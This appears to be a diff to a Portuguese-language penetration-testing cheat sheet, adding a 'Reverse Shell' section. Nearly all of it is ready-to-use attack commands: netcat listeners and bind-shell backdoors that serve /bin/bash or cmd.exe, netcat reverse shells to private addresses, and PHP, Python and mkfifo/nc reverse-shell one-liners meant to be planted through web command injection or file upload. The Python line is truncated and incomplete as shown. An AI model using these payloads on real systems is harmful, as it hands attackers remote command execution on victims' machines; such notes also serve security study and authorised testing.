@@ -152,11 +152,39 @@ $ telnet Target_IP 44444
 
 # 7° Reverse Shell
 
-Execute no terminal shell do Kali Linux $nc -lvnp 6666
+### Listening Basic Linux
+
+$ nc -lnvp 4443
+
+### Listening Basic Windows
+
+C:\ nc -lnvp 4443
+
+### Listening Backdoor Linux
+
+$ nc -lnvp 4443 -e /bin/bash
+
+### Listening Backdoor Windows
+
+C:\ nc -lnvp 4443 -e cmd.exe
+
+### Reverse Shell Linux
+
+$ nc 10.0.0.123 4443 -e /bin/bash
+
+### Reverse CMD Windows
+
+C:\ nc 10.0.0.123 4443 -e cmd.exe
 
 https://www.sans.org/posters/netcat-cheat-sheet
 
-Implante o Payload de Shell Reverso [php, python, nc]
+Implante o Payload de Shell Reverso [php, python, nc] - [inject command web, upload file]
+
+`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))`
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
 
 https://github.com/pentestmonkey/php-reverse-shell
 
